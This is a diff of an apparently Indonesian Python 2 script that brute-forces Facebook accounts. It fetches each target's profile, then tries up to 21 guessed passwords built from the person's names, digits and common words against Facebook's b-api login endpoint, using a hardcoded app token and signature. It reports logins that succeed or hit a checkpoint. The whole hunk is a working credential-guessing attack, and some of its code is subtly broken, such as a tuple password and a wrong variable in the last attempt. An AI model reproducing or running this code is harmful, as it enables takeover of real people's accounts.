@@ -320,109 +320,238 @@ def pilih_super():
 		except OSError:
 			pass
 		try:
-			a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-			b = json.loads(a.text)
-			pass1 = ('786786')
-			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-			q = json.load(data)
-			if 'access_token' in q:
-				print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-				oks.append(user+pass1)
-			else:
-				if 'www.facebook.com' in q["error_msg"]:
-					print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass1
-					cek = open("out/super_cp.txt", "a")
-					cek.write(user+"|"+pass1+"\n")
-					cek.close()
-					cekpoint.append(user+pass1)
-				else:
-					pass2 = b['first_name']+'12345'
-					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-					q = json.load(data)
-					if 'access_token' in q:
-						print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-						oks.append(user+pass2)
-					else:
-						if 'www.facebook.com' in q["error_msg"]:
-							print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass2
-							cek = open("out/super_cp.txt", "a")
-							cek.write(user+"|"+pass2+"\n")
-							cek.close()
-							cekpoint.append(user+pass2)
-						else:
-							pass3 = b['last_name']+'123'
-							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-							q = json.load(data)
-							if 'access_token' in q:
-								print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-								oks.append(user+pass3)
-							else:
-								if 'www.facebook.com' in q["error_msg"]:
-									print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass3
-									cek = open("out/super_cp.txt", "a")
-									cek.write(user+"|"+pass3+"\n")
-									cek.close()
-									cekpoint.append(user+pass3)
-								else:
-									pass4 = b['first_name']+'123'
-									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-									q = json.load(data)
-									if 'access_token' in q:
-										print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-										oks.append(user+pass4)
-									else:
-										if 'www.facebook.com' in q["error_msg"]:
-											print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass4
-											cek = open("out/super_cp.txt", "a")
-											cek.write(user+"|"+pass4+"\n")
-											cek.close()
-											cekpoint.append(user+pass4)
-										else:
-											pass5 = b['first_name']+'1234'
-											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-											q = json.load(data)
-											if 'access_token' in q:
-												print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-												oks.append(user+pass5)
-											else:
-												if 'www.facebook.com' in q["error_msg"]:
-													print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass5
-													cek = open("out/super_cp.txt", "a")
-													cek.write(user+"|"+pass5+"\n")
-													cek.close()
-													cekpoint.append(user+pass5)
-												else:
-													pass6 = b['last_name']+'12345'
-													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-													q = json.load(data)
-													if 'access_token' in q:
-														print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-														oks.append(user+pass6)
-													else:
-														if 'www.facebook.com' in q["error_msg"]:
-															print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass6
-															cek = open("out/super_cp.txt", "a")
-															cek.write(user+"|"+pass6+"\n")
-															cek.close()
-															cekpoint.append(user+pass6)
-														else:
-															a = requests.get('https://graph.facebook.com/'+user+'/?access_token='+toket)
-															b = json.loads(a.text)
-															pass7 = b['last_name']+'1234'
-															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
-															q = json.load(data)
-															if 'access_token' in q:
-																print '\x1b[1;96m[\x1b[1;92mBerhasil\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																oks.append(user+pass7)
-															else:
-																if 'www.facebook.com' in q["error_msg"]:
-																	print '\x1b[1;96m[\x1b[1;93mCekpoint\x1b[1;96m]\x1b[1;97m ' + user + ' \x1b[1;96m|\x1b[1;97m ' + pass7
-																	cek = open("out/super_cp.txt", "a")
-																	cek.write(user+"|"+pass7+"\n")
-																	cek.close()
-																	cekpoint.append(user+pass7)
-																	
-															
+            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
+            b = json.loads(a.text)
+            pass1 = b['first_name'] + '123'
+            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+            q = json.load(data)
+            if 'access_token' in q:
+                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|'+ pass1+'==>' + b['name']
+                print 55 * '\x1b[1;97m\xe2\x95\x90'
+            else:
+                if 'www.facebook.com' in q['error_msg']:
+                    print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass1 +'==>' + b['name']
+                    print 55 * '\x1b[1;97m\xe2\x95\x90'
+                else:               
+                    pass2 = b['first_name'] + '1234'
+                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                    q = json.load(data)
+                    if 'access_token' in q:
+                        print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass2 +'==>' + b['name']
+                        print 55 * '\x1b[1;97m\xe2\x95\x90'
+                    else:
+                        if 'www.facebook.com' in q['error_msg']:
+                            print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass2 +'==>' + b['name']
+                            print 55 * '\x1b[1;97m\xe2\x95\x90'
+                        else:
+                           pass3 = b['first_name'] + '12345'
+                           data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                           q = json.load(data)
+                           if 'access_token' in q:
+                               print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass3 +'==>' + b['name']                              
+                               print 55 * '\x1b[1;97m\xe2\x95\x90'
+                           else:
+                               if 'www.facebook.com' in q['error_msg']:
+                                   print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass3 +'==>' + b['name']
+                                   print 55 * '\x1b[1;97m\xe2\x95\x90'
+                               else:
+                                  pass4 = b['first_name'] + '12356'
+                                  data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                  q = json.load(data)
+                                  if 'access_token' in q:
+                                      print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass4 +'==>' + b['name']
+                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                  else:
+                                      if 'www.facebook.com' in q['error_msg']:
+                                          print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass4 +'==>' + b['name']
+                                          print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                      else:
+                                         pass5 = b['last_name'] + '123'
+                                         data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                         q = json.load(data)
+                                         if 'access_token' in q:
+                                             print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass5 +'==>' + b['name']
+                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                         else:
+                                             if 'www.facebook.com' in q['error_msg']:
+                                                 print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass5 +'==>' + b['name']
+                                                 print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                             else:
+                                                pass6 = b['last_name'] + '1234'
+                                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                q = json.load(data)
+                                                if 'access_token' in q:
+                                                    print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass6 +'==>' + b['name']                                               
+                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                else:
+                                                    if 'www.facebook.com' in q['error_msg']:
+                                                        print '\x1b[1;93m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass6 +'==>' + b['name']
+                                                        print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                    else:
+                                                       pass7 = b['last_name'] + '12345'
+                                                       data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                       q = json.load(data)
+                                                       if 'access_token' in q:
+                                                           print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass7 +'==>' + b['name']                                               
+                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                       else:
+                                                           if 'www.facebook.com' in q['error_msg']:
+                                                               print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass7 +'==>' + b['name']
+                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                           else:
+                                                              pass8 = b['last_name'] + '123456'
+                                                              data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                              q = json.load(data)
+                                                              if 'access_token' in q:
+                                                                  print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass8 +'==>' + b['name']                                               
+                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                              else:
+                                                                  if 'www.facebook.com' in q['error_msg']:
+                                                                      print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass8 +'==>' + b['name']
+                                                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                  else:
+                                                                     pass9 = 'sayang'
+                                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                     q = json.load(data)
+                                                                     if 'access_token' in q:
+                                                                         print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass9 +'==>' + b['name']                                               
+                                                                         print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                     else:
+                                                                         if 'www.facebook.com' in q['error_msg']:
+                                                                             print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass9 +'==>' + b['name']
+                                                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                         else:
+                                                                            pass10 = 'anjing'
+                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                            q = json.load(data)
+                                                                            if 'access_token' in q:
+                                                                                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +'|' + pass10 +'==>' + b['name']                                               
+                                                                                print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                            else:
+                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                    print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +'|' + pass10 +'==>' + b['name']
+                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                else:
+                                                                                   pass11 = 'bangsat'
+                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                   q = json.load(data)
+                                                                                if 'access_token' in q:
+                                                                                    print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass11 +' ==> ' + b['name']                                               
+                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                else:
+                                                                                    if 'www.facebook.com' in q['error_msg']:
+                                                                                        print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass11 +' ==> ' + b['name']
+                                                                                        print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                    else:
+                                                                                       pass12 = 'freefire'
+                                                                                       data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass12 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                       q = json.load(data)
+                                                                                       if 'access_token' in q:
+                                                                                           print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass12 +' ==> ' + b['name']                                               
+                                                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                       else:
+                                                                                           if 'www.facebook.com' in q['error_msg']:
+                                                                                               print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass12 +' ==> ' + b['name'] 
+                                                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                           else:
+                                                                                              pass13 = 'doraemon'
+                                                                                              data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass13 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                              q = json.load(data)
+                                                                                              if 'access_token' in q:
+                                                                                                  print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass13 +' ==> ' + b['name']                                               
+                                                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                              else:
+                                                                                                  if 'www.facebook.com' in q['error_msg']:
+                                                                                                      print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass13 +' ==> ' + b['name'] 
+                                                                                                      print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                  else:
+                                                                                                     pass14 = 'januari'
+                                                                                                     data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass14 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                     q = json.load(data)
+                                                                                                     if 'access_token' in q:
+                                                                                                         print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass14 +' ==> ' + b['name']                                               
+                                                                                                         print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                     else:
+                                                                                                         if 'www.facebook.com' in q['error_msg']:
+                                                                                                             print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass14 +' ==> ' + b['name'] 
+                                                                                                             print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                         else:
+                                                                                                            pass15 = 'password',
+                                                                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass15 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                            q = json.load(data)
+                                                                                                            if 'access_token' in q:
+                                                                                                                print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass15 +' ==> ' + b['name']                                               
+                                                                                                                print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                            else:
+                                                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                                                    print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass15 +' ==> ' + b['name'] 
+                                                                                                                    print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                else:
+                                                                                                                   pass16 = 'persija123'
+                                                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass16 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                   q = json.load(data)
+                                                                                                                   if 'access_token' in q:
+                                                                                                                       print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass16 +' ==> ' + b['name']                                               
+                                                                                                                       print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                   else:
+                                                                                                                       if 'www.facebook.com' in q['error_msg']:
+                                                                                                                           print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass16 +' ==> ' + b['name'] 
+                                                                                                                           print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                       else:
+                                                                                                                          pass17 = 'indonesia'
+                                                                                                                          data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass17 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                          q = json.load(data)
+                                                                                                                          if 'access_token' in q:
+                                                                                                                              print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass17 +' ==> ' + b['name']                                               
+                                                                                                                              print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                          else:
+                                                                                                                              if 'www.facebook.com' in q['error_msg']:
+                                                                                                                                  print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass17 +' ==> ' + b['name'] 
+                                                                                                                                  print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                              else:
+                                                                                                                                 pass18 = 'tidakada'
+                                                                                                                                 data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass18 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                                 q = json.load(data)
+                                                                                                                                 if 'access_token' in q:
+                                                                                                                                     print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user +' | ' + pass18 +' ==> ' + b['name']                                               
+                                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                 else:
+                                                                                                                                      if 'www.facebook.com' in q['error_msg']:
+                                                                                                                                          print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass18 +' ==> ' + b['name'] 
+                                                                                                                                          print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                      else:
+                                                                                                                                          pass19 = b['first_name'] + b['last_name']
+                                                                                                                                          data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass19 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                                          q = json.load(data)
+                                                                                                                                          if 'access_token' in q:
+                                                                                                                                              print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;92m] ' + user + ' | ' + pass19 +' ==> ' + b['name']                                               
+                                                                                                                                              print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                          else:
+                                                                                                                                               if 'www.facebook.com' in q['error_msg']:
+                                                                                                                                                   print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;93m] ' + user +' | ' + pass19 +' ==> ' + b['name'] 
+                                                                                                                                               else:
+                                                                                                                                                   pass20 = b['first_name'] + b['last_name'] + '123'
+                                                                                                                                                   data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                                                   q = json.load(data)
+                                                                                                                                                   if 'access_token' in q:
+                                                                                                                                                       print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;97m] ' + user +' | ' + pass20 +'==>' + b['name']                                               
+                                                                                                                                                       print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                                   else:
+                                                                                                                                                        if 'www.facebook.com' in q['error_msg']:
+                                                                                                                                                            print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass20 +'==>' + b['name'] 
+                                                                                                                                                            print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                                        else:
+                                                                                                                                                           pass21 = b['first_name'] + b['last_name'] + '1234'
+                                                                                                                                                           data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass20 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
+                                                                                                                                                           q = json.load(data)
+                                                                                                                                                           if 'access_token' in q:
+                                                                                                                                                               print '\x1b[1;97m[\x1b[1;92mBerhasil\xe2\x9c\x93\x1b[1;97m] ' + user +' | ' + pass21 +'==>' + b['name']                                               
+                                                                                                                                                               print 55 * '\x1b[1;97m\xe2\x95\x90'
+                                                                                                                                                           else:
+                                                                                                                                                                if 'www.facebook.com' in q['error_msg']:
+                                                                                                                                                                     print '\x1b[1;97m[\x1b[1;93mCekpoint\xe2\x9c\x9a\x1b[1;97m] ' + user +' | ' + pass21 +'==>' + b['name'] 
+                                                                                                                                                                     print 55 * '\x1b[1;97m\xe2\x95\x90'
+
 		except:
 			pass
 		
